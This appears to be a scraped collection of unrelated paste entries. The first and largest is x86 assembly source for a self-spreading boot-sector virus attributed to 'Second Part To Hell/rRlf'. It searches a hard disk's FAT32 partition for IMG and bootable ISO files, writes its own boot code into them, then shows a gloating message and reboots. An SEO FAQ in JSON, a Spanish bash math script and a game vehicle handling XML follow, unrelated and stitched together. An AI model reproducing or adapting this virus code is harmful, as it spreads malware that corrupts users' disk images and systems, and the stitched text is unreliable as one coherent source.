 db 0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30	; FAT12 Table
 db 0x00,0x02,0x01,0x01,0x00,0x02,0xE0,0x00
 db 0x40,0x0B,0xF0,0x09,0x00,0x12,0x00,0x02
 db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
 db 0x00,0x00,0x00,0x29,0x8C,0x22,0x2F,0x7C
 db 0x4E,0x4F,0x20,0x4E,0x41,0x4D,0x45,0x20
 db 0x20,0x20,0x20,0x46,0x41,0x54,0x31,0x32
 db 0x20,0x20,0x20


startboot:
	cli					; No Interrupts
	mov	ax,0x9000			; Make the stack at 0x9000
	mov	ss, ax				; Stack=0x9000
	mov	sp, 0				; Stackpointer=0x0
	sti					; Allow Interrupts

	mov	[bootdrv], dl			; Save the bootdevice

loada:
	push	ds				; Save DS
	mov	ax, 0				; Function: Diskdrive reset
	mov	dl, [bootdrv]			; Bootdevice to dl
	int	0x13				; Execute
	pop	ds				; Get DS
	jc	loada				; If Error, do it again


load1:
	mov	ax, 0x1000			; Where to read: 0x1000
	mov	es, ax				; ES=0x1000
	mov	bx, 0				; BX=0
	mov	ah, 0x2				; Read sectors
	mov	al, 0x3				; Read 3 sectors
	mov	cx, 2				; Start at sector 2
	mov	dx, 0				; At current disk (or emulated disk)
	int	0x13				; Execute
	jc	load1				; If error, do it again

	mov	ax, 0x1000			; AX=0x1000
	mov	es, ax				; ES=0x1000
	mov	ds, ax				; DS=0x1000
	push	ax				; push 0x1000 to stack
	mov	ax, 0				; AX=0x0
	push	ax				; push 0x0 to stack
	retf

	bootdrv db 0				; Byte for bootdevice

endboot:
	times (512-(endboot-stfat)-2) db 0
	dw 0xAA55

	org	0x0			; Offsets + 0x0
start:
	mov	bx, 0x2000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, 1			; Start at sector 1
	mov	ch, 0			; Cylinder=0
	mov	dh, 0			; Head=0
	mov	dl, 0x80		; Drive=0x80=HD
	int	0x13			; Read MBR

	xor	bx, bx			; bx=0=Start of MBR
	mov	ax, [bx+454]		; ax=1st Partition's start: Partitiontable (446) + 8 = 454
	mov	cl, [bx+447]		; cl=Sector of 1st Partition in CHS: 446 + 1 = 447
	mov	dh, [bx+448]		; dh=Head of 1st Partition in CHS: 446 + 2 = 448
	mov	ch, [bx+449]		; ch=Cylinder of 1st Partition in CHS: 446 + 3=449

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[BootSecPar], ax	; Save 1st Partition's start in LBA

	mov	ah, 0x2			; Read
	mov	al, 0x10		; 16 Sector
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x2000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx			; BX=0x0
	int	0x13			; Read First Sector of Partition

	xor	bx, bx			; BX=0x0
	mov	ah, [bx+24]		; ah=BPB_SecPerTrk: For CHS calculation
	mov	al, [bx+26]		; al=BPB_NumHeads: For CHS calculation

	mov	cl, [bx+13]		; cl=Sector per cluster
	mov	ch, [bx+16]		; ch=Number of FATs
	mov	si, [bx+14]		; si=Reserved Sectors
	mov	ebp, [bx+44]		; ebp=RootCluster
	mov	edx, [bx+36]		; edx=Sectors per FAT

	mov	bx, 0x1000		; bx=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[TotalSector], ah	; Save BPB_SecPerTrk
	mov	[TotalHead], al		; Save BPB_NumHeads

	mov	[SecPerClust], cl	; Save Sector per cluster
	mov	[ReservedSec], si	; Save Reserved Sector
	mov	[NumOfFats], ch		; Save Number Of FATs
	mov	[SecPerFat], edx	; Save Sector Per FAT
	mov	[LBA], ebp		; Save Root Cluster

	call	getLBA			; Get the real sector number
					; Returns the real sector number in EAX

	call	CHS			; CHS

	mov	ah, 0x2			; Read
	mov	al, 0x10		; 16 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x2000		; bp=0x2000
	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, bx
	xor	bx, bx
	int	0x13			; Read Sectors

fat32read:
	mov	cx, 0x2000		; cx=0x2000
	mov	es, cx			; Data will be read to ES:BX, ES=0x2000
	mov	ds, cx

	mov	ah, [bx]		; ah=First byte of Filename
	test	ah, ah	 		; Check if zero. If zero, it's the last entry
	jz	ende_a			; If it's the last entry of this directory, stopp the filesearching
	cmp	ah, 0xE5		; Check if the byte is 0xE5. If so, it's a deleted file
	je	fat32next		; If deleted file, get next entry

	mov	al, [bx+2]		; al=3rd letter of name
	test	al, al			; Check if zero
	jz 	fat32next		; If zero, get next entry

	mov	al, [bx+11]		; Move the Filetype to AL
	cmp	al, 0x10		; Compaire with 0x10 (=Directory)
	je	fat32next		; If it's a directory, save the cluster

	mov	ax, word [bx+8]		; 9th and 10th Letter to ax
	cmp	ax, 'IM'		; Check if it's 'IM'
	jne	fat32noimg		; If not, no IMG file
	mov	al, byte [bx+10]	; Move 10th letter to al
	cmp	al, 'G'			; Check if 10th letter='G'
	jne	fat32noimg		; If not, no IMG file
	mov	eax, [bx+0x1C]		; eax=Size of file
	cmp	eax, (totalend-start)+512	; Minimum size of file: 1st sector+viruslength
	js	fat32next		; If not big enough, not infect this file

	push	bx
	call	infectionIMG		; Infection!
	pop	bx

fat32noimg:
	mov	ax, word [bx+8]		; 9th and 10th Letter to ax
	cmp	ax, 'IS'		; Check if it's 'IS'
	jne	fat32noiso		; If not, no ISO file
	mov	al, byte [bx+10]	; Move 10th letter to al
	cmp	al, 'O'			; Check if 10th letter='S'
	jne	fat32noimg		; If not, no IMG file


	push	bx
	call	infectionISO		; Infection!
	pop	bx

fat32noiso:
fat32next:
	add	bx, 0x20		; Next entry
jmp  fat32read


infectionIMG:

	mov	ax, [bx+20]		; High number of cylinder to ax
	shl	eax, 0x10		; High number in e-part of eax
	mov	ax, [bx+26]		; Low number of cylinder to ax

	mov	bx, 0x1000		; ax=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0
	mov	[LBA], eax		; DataCluster=EAX

	call	getLBA			; Get the real sector number
					; Returns the sector number in EAX
	mov	[LBA], eax		; Save the LBA
	call	CHS			; Get the CHS of the real sector number

	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sectors

	mov	eax, [bx+0x37]		; At 0x36: ""FAT12""-mark
	cmp	eax, 'AT12'		; Compaire the values
	call	infectimgwrite		; If equal, infect it
ret					; Otherwise return to the file-search procedure

infectimgwrite:
	mov	ax, 0x1000		; AX=0x1000 (Virus in Memory)
	mov	ds, ax			; DS=0x1000
	mov	ax, 0x3000		; AX=0x3000 (Bootsector of File in Memory)
	mov	es, ax
	mov	cx, 62			; Length of 1st sector data
	mov	si, fat12bootsector	; Where the data is
	mov	di, 0x3E		; The FAT12 at 1st sector in IMG file
	rep	movsb			; Move CX bytes from DS:SI to ES:DI
					; Move 62 bytes from 0x1000:data1stsector to 0x3000:0x3E

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	ax, 0x3CEB		; AX=Jmp over FAT12 Table
	mov	[bx], ax		; Write the JMP to the changed sector

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	ah, 0x3			; Write
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0
	int	0x13			; Write Bootsector

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	cx, 3			; Do it 3 times
   WriteSecs:
	push	cx
	push	bx

	mov	eax, [LBA]

	mov	edx, 4
	sub	dx, cx
	add	eax, edx		; Get next sector
	xor	edx, edx

	call	CHS			; CHS
	pop	bx			; restore bx

	mov	ah, 0x3			; Write
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=??
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD
	int	0x13			; Write Sectors

	pop	cx			; Restore cx

	add	bx, 0x200		; Next sector
   loop WriteSecs
ret

infectionISO:

	mov	ax, [bx+20]		; High number of cylinder to ax
	shl	eax, 0x10		; High number in e-part of eax
	mov	ax, [bx+26]		; Low number of cylinder to ax

	mov	bx, 0x1000		; ax=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[LBA], eax		; DataCluster=EAX

	call	getLBA			; Get the sector number
	push	eax			; Save the start of the file
	add	eax, 17*4		; Bootrecord Volume is ALWAYS at CD-ROM Sector 17
					; A CD-ROM sector is ALWAYS 0x800
					; A HD sector is ALWAYS (?) 0x200 (0x200*4[!]=0x800)
					; We now have the sector of the Boot Record Volume of the ISO file at the HD

	call	CHS			; Now calculate the CHS


	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sector
					; Now we have the Boot Record Volume

	pop	ecx			; ECX=Start of file

	mov	eax, [bx+7]		; Move Byte 7-10 to eax
	cmp	eax, 'EL T'		; Check if it's a bootable ISO file
					; String should be 'EL TORITO SPECIFICATION'
	jne	EndISOInfection		; If not: SHIT! ;)

	push	ecx			; Save the Start of the file again

	mov	eax, [bx+71]		; Move the 'Absolute pointer to first sector of Boot Catalog' to eax
	mov	edx, 4
	mul	edx			; You know: 0x800/0x200=4; Now it's the right sectornumber

	add	eax, ecx		; Sector number at HD

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0


	call	CHS			; Get the CHS
	
	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sector
					; Now we have the Boot Catalog

	pop	ecx			; Get Start of the file
	mov	al, [bx+32]		; AL=Boot Indicator: 0x88=bootable
	cmp	al, 0x88		; Check if it's bootable
	jne	EndISOInfection		; If not: SHIT! ;)

	mov	eax, [bx+40]		; This is the start sector of the virtual Disk
	mov	edx, 4			; EDX=4
	mul	edx			; EAX=The real Sector in the file
	add	eax, ecx		; EAX=The Sector of it on the HD

	mov	bx, 0x1000		; bx=0x1000
	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	mov	[LBA], eax
	call	CHS			; Get the CHS

	mov	ah, 0x2			; Read
	mov	al, 0x1			; 1 Sector
	mov	cl, [sector]		; Start at sector ??
	mov	ch, [cylinder]		; Cylinder=?
	mov	dh, [head]		; Head=??
	mov	dl, 0x80		; Drive=0x80=HD

	mov	bx, 0x3000		; bx=0x3000
	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
	mov	ds, bx
	xor	bx, bx			; BX=0x0

	int	0x13			; Read Sector
					; Now we have the Bootsector of the virtual Disk

	call	infectimgwrite		; Infect the file!!!

EndISOInfection:
ret


ende_a:
	mov	ax, 0x1000		; ax=0x1000
	mov	es, ax			; Data will be read to ES:BX, ES=0x1000
	mov	ds, ax
	xor	bx, bx			; BX=0x0

	mov	cx, 116			; 116 Letters
	mov	si, endmsg 		; si=Offset of String
	jmp eee
   putstra:
	lodsb				; [si]->al
	mov	ah, 0xE 		; ah=0xE: Print Letter to Screen
	mov	bx, 0x7
	int	0x10			; call
   loop	putstra				; Next Letter
	mov	al, 13
	mov	ah, 0xE
	mov	bx, 0x7
	int	0x10
	mov	al, 10
	mov	ah, 0xE
	mov	bx, 0x7
	int	0x10
   ret
eee: call putstra
	mov	ah, 0			; ah=0: Get Key BIOS Function
	int	0x16			; Call
	jmp	reboot			; Now let's reboot!


CHS:
	xor	ebx, ebx		; ebx=0
	mov	bl, [TotalSector]	; Total Sectors
	div	ebx			; EDX:EAX DIV EBX=
					; EAX= Quotient
					; EDX= Reminder
	inc	dx			; Reminder+1=Sector
	mov	[sector], dl		; Sector=Reminder (not more than 0xFF)
	mov	[cylhead], eax

	mov	edx, eax		; EDX=Quotient
	shr	edx, 16			; DX=High number of quotient

	xor	bx, bx			; BX=0
	mov	bl, [TotalHead]		; Total Heads
	div	bx			; DX:AX DIV BX=
					; AX= Quotient
					; DX= Reminder

	mov	[head], dl		; Head=Reminder
	mov	[cylinder], al		; Cylinder=Quotient
	shl	ah, 6			; 0000 00?? -> ??00 0000
	mov	al, [sector]		; high two bits of cylinder (bits 6-7, hard disk only)
	or	al, ah			; 00xx xxxx -> ??xx xxxx
	mov	[sector], al		; Save!
ret

getLBA:
	;; Find Data: 
	;; (boot sector)+(number of fats)*(sectors per fat)+(reserved sectors)+(Data cluster-2)*(sectors per cluster)
	;; DataCluster saved in LBA

	mov	eax, [SecPerFat]	; eax=SecPerFat
	xor	bx, bx			; bx=0
	mov	bl, [NumOfFats]		; bl=NumOfFats
	mul	bx			; AX*BX=DX:AX

	mov	[FATCalc], ax		; Save the result

	xor	eax, eax		; EAX=0
	mov	al, [SecPerClust]	; al=SecPerClust
	mov	ebx, [LBA]		; ebx=DataCluster
	sub	ebx, 2			; DataCluster-=2

	mul	ebx			; EAX*EBX=EDX:EAX

	mov	[ClustCalc], eax	; Save the result

	xor	eax, eax		; eax=0
	mov	ax, [BootSecPar]	; AX=Sectors before the 1st partition
	xor	ebx, ebx		; ebx=0
	mov	bx, [FATCalc]		; BX=(number of fats)*(sectors per fat)
	add	eax, ebx		; AX+=BX
	mov	bx, [ReservedSec]	; BX=Reserved Sectors
	add	eax, ebx		; AX+=BX
	mov	ebx, [ClustCalc]	; BX=(Root Cluster-2)*(Sectors per Cluster)
	add	eax, ebx		; AX+=BX

	xor	edx, edx		; EDX=0
ret

	endmsg		db 13,10,13,10,13,10
			db 'Thank you for using SPTH-OS 2.0!',13,10
			db 'This may spread better then Windows(c)(r)tm ;-)',13,10
			db 'by Second Part To Hell/rRlf'

	sector		db 0x0
	head		db 0x0
	cylinder	db 0x0, 0x0
	cylhead		dd 0x0
	bit2cyl		db 0x0
	LBA		dd 0x0
	BootSecPar	dw 0x0

	TotalSector	db 0x0			; BPB_SecPerTrk: For CHS calculation
	TotalHead	db 0x0			; BPB_NumHeads: For CHS calculation

	SecPerClust	db 0x0			; Offset 13
	ReservedSec	dw 0x0			; Offset 14
	NumOfFats	db 0x0			; Offset 16
	SecPerFat	dd 0x0			; Offset 36

	FATCalc		dw 0x0			; NumOfFats*SecPerFat (should not be greater than 0xFFFF)
	ClustCalc	dd 0x0			; (RootClust-2)*(SecPerClust)

fat12bootsector:
	db 0xFA,0xB8,0x00,0x90,0x8E,0xD0,0xBC,0x00
	db 0x00,0xFB,0x88,0x16,0x7C,0x7C,0x1E,0xB8
	db 0x00,0x00,0x8A,0x16,0x7C,0x7C,0xCD,0x13
	db 0x1F,0x72,0xF3,0xB8,0x00,0x10,0x8E,0xC0
	db 0xBB,0x00,0x00,0xB4,0x02,0xB0,0x03,0xB9
	db 0x02,0x00,0xBA,0x00,0x00,0xCD,0x13,0x72
	db 0xEA,0xB8,0x00,0x10,0x8E,0xC0,0x8E,0xD8
	db 0x50,0xB8,0x00,0x00,0x50,0xCB

reboot:
	db 	0xEA			; Hexdump for reboot: jmp 00FF:FF00
	dw 	0x0
	dw 	0xFFFF

totalend:"
4zuDNDeA,FAQ,jaideep06,JSON,Tuesday 4th of July 2023 11:17:38 PM CDT,"{
  ""@context"": ""https://schema.org"",
  ""@type"": ""FAQPage"",
  ""mainEntity"": [
    {
      ""@type"": ""Question"",
      ""name"": ""What is SEO for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""SEO for small businesses is the practice of optimizing websites to improve their visibility on search engine result pages (SERPs) and attract organic traffic. It involves techniques such as keyword research, on-page optimization, content creation, and link building, all aimed at enhancing the website's relevance and authority for targeted search queries.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""How to do search engine optimization for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""To perform search engine optimization (SEO) for small businesses, start by conducting keyword research to identify relevant keywords and phrases. Optimize your website's on-page elements, including meta tags, headings, and content, to align with these keywords. Create high-quality, informative content that satisfies user intent and encourages engagement. Build authoritative backlinks from reputable sources. Regularly analyze and refine your SEO strategy based on performance data.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What is local SEO for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""Local SEO for small businesses focuses on optimizing websites to improve visibility in local search results. It involves optimizing Google My Business listings, obtaining local citations, and generating positive reviews. Targeting location-specific keywords and creating localized content are also key. Consistent NAP (Name, Address, Phone number) information across directories is crucial for local SEO success.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""Is SEO worth it for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""Yes, investing in SEO is worth it for small businesses. It helps increase online visibility, attract targeted organic traffic, and improve brand recognition. By optimizing their websites and appearing prominently in search results, small businesses can gain a competitive edge, reach a wider audience, and drive valuable conversions.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""Does SEO work for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""Yes, SEO does work for small businesses when implemented effectively. By following SEO best practices, small businesses can improve their website's visibility, increase organic traffic, and achieve higher rankings on search engine result pages. However, it requires consistent effort, strategic planning, and adapting to evolving search engine algorithms.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""Is SEO important for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""Yes, SEO is highly important for small businesses. It enables them to compete with larger competitors by leveling the online playing field. Effective SEO strategies help small businesses increase their online visibility, reach their target audience, and establish credibility and trust among potential customers.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""Why is SEO important for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""SEO is important for small businesses because it drives organic traffic, increases brand visibility, and boosts online presence. By optimizing their websites, small businesses can improve their chances of being found by potential customers who are actively searching for their products or services, resulting in valuable leads and conversions.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""How does SEO benefit small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""SEO benefits small businesses by enhancing their online visibility and discoverability. It improves their website's rankings on search engines, drives targeted organic traffic, and increases the likelihood of attracting potential customers. Effective SEO strategies help small businesses compete effectively in the digital landscape and achieve sustainable growth.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""How can small businesses implement DIY SEO?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""Small businesses can implement DIY SEO by following best practices and utilizing various resources available. Conduct thorough keyword research, optimize on-page elements such as meta tags and headings, create high-quality content, build authoritative backlinks, optimize website speed and mobile-friendliness, and monitor performance using tools like Google Analytics and Google Search Console.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What is the cost of SEO for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The cost of SEO for small businesses can vary depending on the scope and complexity of the project. It can range from DIY efforts that require time and resources to hiring professional SEO services. Small businesses should consider their specific needs and budget while evaluating the potential return on investment (ROI) of SEO activities.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What are the advantages of SEO for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""SEO offers several advantages for small businesses. It helps increase website visibility, drives targeted organic traffic, builds brand authority and credibility, improves user experience, and increases the likelihood of conversions. By investing in SEO, small businesses can gain a competitive edge and achieve sustainable growth in the digital landscape.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What are the 5 benefits of SEO for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The five key benefits of SEO for small businesses are increased visibility and exposure, targeted organic traffic, improved user experience, enhanced brand recognition and credibility, and higher conversion rates. These benefits contribute to the overall success and growth of small businesses in the competitive online marketplace.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""Is content marketing replacing the need for SEO for small business owners?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""No, content marketing is not replacing the need for SEO. While content marketing plays a crucial role in attracting and engaging audiences, SEO ensures that the content is discoverable and reaches the intended target audience. Combining content marketing with SEO strategies maximizes the visibility, impact, and effectiveness of small business marketing efforts.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What is the ROI of SEO for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The return on investment (ROI) of SEO for small businesses can vary depending on factors such as industry, competition, and the effectiveness of SEO strategies. However, a well-executed SEO campaign can lead to significant long-term benefits, including increased organic traffic, higher conversion rates, and improved brand visibility, resulting in a positive ROI.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What are some local SEO options for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""Local SEO options for small businesses include optimizing Google My Business listings, obtaining local citations and backlinks, targeting local keywords in content and meta tags, managing online reviews, and ensuring consistent NAP information across online directories. Additionally, participating in local events and engaging with the local community can enhance local SEO efforts.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""How can I improve local SEO for my small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""To improve local SEO for your small business, optimize your Google My Business listing by providing accurate and complete information. Encourage customers to leave reviews and obtain local citations and backlinks from authoritative local websites. Target local keywords in your content, ensure consistent NAP information, and actively manage and respond to online reviews to enhance local SEO visibility.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What are the best recommendations and methods for SEO for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The best recommendations and methods for SEO for small businesses include conducting thorough keyword research, optimizing on-page elements, creating high-quality and relevant content, building high-quality backlinks, optimizing website loading speed and mobile-friendliness, and tracking and analyzing SEO performance using tools like Google Analytics and Google Search Console. Additionally, staying updated with industry trends and algorithm changes is essential for effective SEO.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What are the best local SEO strategies for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The best local SEO strategies for small businesses involve optimizing Google My Business listings, obtaining local citations and backlinks, targeting location-specific keywords, creating localized content, managing online reviews, and participating in local events and community activities. Consistency in NAP information across directories is also crucial for local SEO success.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What is the future of local SEO for small businesses?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The future of local SEO for small businesses is likely to focus on providing personalized and localized search experiences. This includes voice search optimization, increased importance of online reviews, better integration with mobile devices, and advancements in technologies such as augmented reality (AR) and artificial intelligence (AI) that enhance local search experiences.""
      }
    },
    {
      ""@type"": ""Question"",
      ""name"": ""What is the best SEO for small business?"",
      ""acceptedAnswer"": {
        ""@type"": ""Answer"",
        ""text"": ""The best SEO for small businesses involves a holistic approach that includes optimizing on-page elements, creating high-quality and engaging content, building authoritative backlinks, ensuring website technical health, optimizing for mobile devices, and staying updated with the latest SEO trends and algorithm changes.""
      }
    }
  ]
}"
D29KkMCR,codigo examen 2,kuroshan1104,Bash,Tuesday 4th of July 2023 08:48:35 PM CDT,"#!/bin/bash

function es_primo() {
    local num=$1
    local i=2

    if [ $num -lt 2 ]; then
        return 1
    fi

    while [ $((i * i)) -le $num ]
    do
        if [ $((num % i)) -eq 0 ]; then
            return 1
        fi
        i=$((i + 1))
    done

    return 0
}


function calcular_raiz_cuadrada() {
    local num1=$1
    local num2=$2

    if [ $num1 -gt $num2 ]; then
        mayor=$num1
    else
        mayor=$num2
    fi

    raiz=$(echo ""scale=2; sqrt($mayor)"" | bc)
    echo ""La raíz cuadrada del número mayor ($mayor) es: $raiz""
}

function calcular_factorial() {
    local num1=$1
    local num2=$2

    if [ $num1 -lt $num2 ]; then
        menor=$num1
    else
        menor=$num2
    fi

    factorial=1
    for ((i=2; i<=menor; i++))
    do
        factorial=$((factorial * i))
    done

    echo ""El factorial del número menor ($menor) es: $factorial""
}

function menu() {
    echo ""--------------- Menú --------------""
    echo ""1) Verificar si dos números son primos""
    echo ""2) Calcular la raíz cuadrada del número mayor""
    echo ""3) Calcular el factorial del número menor""
    echo ""4) Salir""
    echo ""-----------------------------------""

    read -p ""Ingrese una opción: "" opcion

    case $opcion in
        1)
            read -p ""Ingrese el primer número: "" num1
            read -p ""Ingrese el segundo número: "" num2
            if es_primo $num1 && es_primo $num2; then
                echo ""Ambos números son primos.""
            elif es_primo $num1 || es_primo $num2; then
                echo ""Solo uno de los números es primo.""
            else
                echo ""Ninguno de los números es primo.""
            fi
            ;;
        2)
            read -p ""Ingrese el primer número: "" num1
            read -p ""Ingrese el segundo número: "" num2
            calcular_raiz_cuadrada $num1 $num2
            ;;
        3)
            read -p ""Ingrese el primer número: "" num1
            read -p ""Ingrese el segundo número: "" num2
            calcular_factorial $num1 $num2
            ;;
        4)
            echo ""Saliendo...""
            exit
            ;;
        *)
            echo ""Opción inválida. Por favor, ingrese una opción válida.""
            ;;
    esac
}

while true
do
    menu
    echo
done

"
4ea3F6Y8,Untitled,Eddlm,XML,Tuesday 4th of July 2023 08:42:35 PM CDT,"
    <Item type=""CHandlingData"">
      <handlingName>GAUNTLET3</handlingName>
      <fMass value=""1600.000000"" />
      <fInitialDragCoeff value=""7.0"" />
      <fDownforceModifier value=""1.075"" />
      <fPercentSubmerged value=""85.000000"" />
      <vecCentreOfMassOffset x=""0.000000"" y=""0.050000"" z=""0.300000"" />
      <vecInertiaMultiplier x=""1.2500000"" y=""1.500000"" z=""2.0000"" />
      <fDriveBiasFront value=""0.000"" />
      <nInitialDriveGears value=""5"" />
      <fInitialDriveForce value=""0.27500"" />
      <fDriveInertia value=""1.000000"" />
      <fClutchChangeRateScaleUpShift value=""1.500000"" />
      <fClutchChangeRateScaleDownShift value=""2.00000"" />
      <fInitialDriveMaxFlatVel value=""130.000000"" />
      <fBrakeForce value=""0.5000"" />
      <fBrakeBiasFront value=""0.62500"" />
      <fHandBrakeForce value=""0.75000"" />
      <fSteeringLock value=""40.000000"" />
      <fTractionCurveMax value=""1.7000"" />
      <fTractionCurveMin value=""1.6000"" />
      <fTractionCurveLateral value=""23.00000"" />
      <fTractionSpringDeltaMax value=""0.100"" />
      <fLowSpeedTractionLossMult value=""0.500"" />
      <fCamberStiffnesss value=""0.000000"" />
      <fTractionBiasFront value=""0.4900"" />
      <fTractionLossMult value=""0.33300"" />
      <fSuspensionForce value=""3.0000"" />
      <fSuspensionCompDamp value=""1.20000"" />
      <fSuspensionReboundDamp value=""1.20000"" />
      <fSuspensionUpperLimit value=""0.1250000"" />
      <fSuspensionLowerLimit value=""-0.125000"" />
      <fSuspensionRaise value=""0.000000"" />
      <fSuspensionBiasFront value=""0.500000"" />
      <fAntiRollBarForce value=""0.000"" />
      <fAntiRollBarBiasFront value=""0.50000"" />
      <fRollCentreHeightFront value=""0.2500"" />
      <fRollCentreHeightRear value=""0.250"" />
      <fCollisionDamageMult value=""0.700000"" />
      <fWeaponDamageMult value=""1.000000"" />
      <fDeformationDamageMult value=""0.700000"" />
      <fEngineDamageMult value=""1.500000"" />
      <fPetrolTankVolume value=""65.000000"" />
      <fOilVolume value=""5.000000"" />
      <fSeatOffsetDistX value=""0.150000"" />
      <fSeatOffsetDistY value=""0.000000"" />
      <fSeatOffsetDistZ value=""0.000000"" />
      <nMonetaryValue value=""25000"" />
      <strModelFlags>440010</strModelFlags>
      <strHandlingFlags>820100</strHandlingFlags>
      <strDamageFlags>0</strDamageFlags>
      <AIHandling>SPORTS_CAR</AIHandling>
      <SubHandlingData> 
        <Item type=""NULL"" />
        <Item type=""NULL"" />
        <Item type=""NULL"" />
      </SubHandlingData>
